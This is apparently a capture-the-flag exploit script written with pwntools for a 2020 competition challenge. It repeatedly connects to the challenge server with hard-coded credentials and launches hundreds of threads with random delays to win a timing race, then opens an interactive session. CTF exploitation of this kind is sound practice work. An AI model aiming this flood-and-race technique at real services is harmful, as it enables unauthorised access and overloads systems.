#!/usr/bin/env python
from pwn import *
import random
import time
import tqdm


def rand_test():
    # randomly, we will wait the exact time to cause the interrupt
    sleep_time = random.uniform(0, 1)
    context.log_level = 30
    io = remote("avr.2020.ctfcompetition.com",1337)

    io.send("\n") # the timer starts after this

    time.sleep(sleep_time)
    io.send("agent\ndoNOTl4unch_missi1es!\n")

    io.send("2\n")

    data = io.readuntil("Access granted")
    data = io.readuntil("Menu:")
    if "on." in data:
        for i in range(40):
            time.sleep(2)
            io.send("2\n")
            io.interactive()
        exit()
    io.close()

while True:
    ts = []
    for i in tqdm.tqdm(range(500)):
        t = threading.Thread(target=rand_test)
        t.start()
        ts.append(t)
    for t in tqdm.tqdm(ts):
        t.join()


#print "finish",data1